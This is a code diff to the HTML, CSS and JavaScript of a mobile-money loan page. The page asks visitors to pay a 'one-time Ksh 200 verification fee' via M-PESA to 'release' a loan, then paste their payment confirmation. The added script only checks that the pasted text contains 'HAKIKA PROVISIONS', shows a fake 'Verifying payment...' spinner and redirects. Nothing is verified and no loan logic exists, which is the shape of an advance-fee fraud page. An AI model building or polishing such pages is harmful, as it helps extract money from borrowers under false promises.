@@ -57,7 +57,7 @@ body {
     to {opacity: 1; transform: translateY(0);}
 }
 
-/* VERIFICATION BADGE */
+/* VERIFICATION ICON */
 .verify-icon {
     width: 85px;
     height: 85px;
@@ -143,7 +143,7 @@ body {
     background: var(--primary-dark);
 }
 
-/* M-PESA CONFIRMATION INPUT */
+/* CONFIRMATION INPUT */
 .confirmation-box {
     margin-top: 15px;
 }
@@ -176,25 +176,66 @@ body {
     transform: translateY(-2px);
     box-shadow: 0 7px 18px rgba(11,138,68,0.25);
 }
+
+/* LOADER */
+#loader {
+    display: none;
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid var(--primary);
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1001;
+}
+
+@keyframes spin {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+}
+
+/* TOAST */
+#toast {
+    visibility: hidden;
+    min-width: 250px;
+    background-color: var(--primary);
+    color: white;
+    text-align: center;
+    border-radius: 8px;
+    padding: 16px;
+    position: fixed;
+    z-index: 1000;
+    left: 50%;
+    bottom: 30px;
+    transform: translateX(-50%);
+    font-size: 16px;
+    opacity: 0;
+    transition: opacity 0.5s ease, bottom 0.5s ease;
+}
+
+#toast.show {
+    visibility: visible;
+    opacity: 1;
+    bottom: 50px;
+}
 </style>
 </head>
 <body>
 
-<!-- HEADER -->
 <div class="header">
     <h1>Final Verification</h1>
     <p>Complete your one-time Ksh 200 fee payment to release your loan.</p>
 </div>
 
-<!-- MAIN CARD -->
 <div class="card">
-
     <div class="verify-icon">✔</div>
-
     <div class="title">Almost There!</div>
     <p class="subtitle">Follow the steps below to complete verification and receive your loan.</p>
 
-    <!-- SUMMARY -->
     <div class="summary-box">
         <div class="row">
             <span>Approved Amount:</span>
@@ -218,7 +259,6 @@ body {
         </div>
     </div>
 
-    <!-- PAYMENT INSTRUCTIONS -->
     <div class="payment-box">
         <p><strong>Step 1:</strong> Pay the one-time Ksh 200 verification fee via M-PESA.</p>
         <p><strong>Step 2:</strong> Go to M-PESA → Lipa na M-PESA → Pay Bill → Enter the details below:</p>
@@ -229,19 +269,20 @@ body {
         <p><strong>Amount:</strong> Ksh 200</p>
     </div>
 
-    <!-- CONFIRMATION INPUT -->
     <div class="confirmation-box">
         <p>Step 3: Paste the M-PESA confirmation message below after payment:</p>
         <textarea id="mpesaMsg" rows="4" placeholder="Paste M-PESA message here..."></textarea>
-        <button onclick="completeVerification()">Submit & Verify</button>
+        <button id="submitBtn">Submit & Verify</button>
     </div>
-
 </div>
+
+<div id="loader"></div>
+<div id="toast"></div>
 
 <script>
 let limit = parseFloat(localStorage.getItem("amount")) || 5000;
 let interest = parseFloat(localStorage.getItem("interest")) || (limit*0.08);
-let fee = 200; // fixed verification fee
+let fee = 200; 
 let received = limit - interest - fee;
 let phone = localStorage.getItem("phone") || "07XXXXXXXX";
 
@@ -253,21 +294,41 @@ document.getElementById("mpesa").textContent = phone;
 
 function copyTill() {
     let till = document.getElementById("tillNumber").textContent;
-    navigator.clipboard.writeText(till).then(() => {
-        alert("Till number copied!");
-    });
+    navigator.clipboard.writeText(till).then(() => showToast("Till number copied!"));
 }
 
-function completeVerification() {
+function showToast(message) {
+    const toast = document.getElementById("toast");
+    toast.textContent = message;
+    toast.className = "show";
+    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
+}
+
+function showLoader() {
+    document.getElementById("loader").style.display = "block";
+}
+
+document.getElementById("submitBtn").addEventListener("click", () => {
     let msg = document.getElementById("mpesaMsg").value.trim();
+
     if (!msg) {
-        alert("Please paste the M-PESA confirmation message before submitting.");
+        showToast("Please paste the M-PESA confirmation message before submitting.");
         return;
     }
-    // Here you can send msg to server via fetch/AJAX
-    alert("Payment verified! Your loan will be processed.");
-    window.location.href = "applicationstatus.html";
-}
+
+    // Check if message contains "HAKIKA PROVISIONS"
+    if (!msg.includes("HAKIKA PROVISIONS")) {
+        showToast('Paste the correct M-Pesa message received!');
+        return;
+    }
+
+    showToast("Verifying payment...");
+    showLoader();
+
+    setTimeout(() => {
+        window.location.href = "applicationstatus.html";
+    }, 2000);
+});
 </script>
 </body>
 </html>
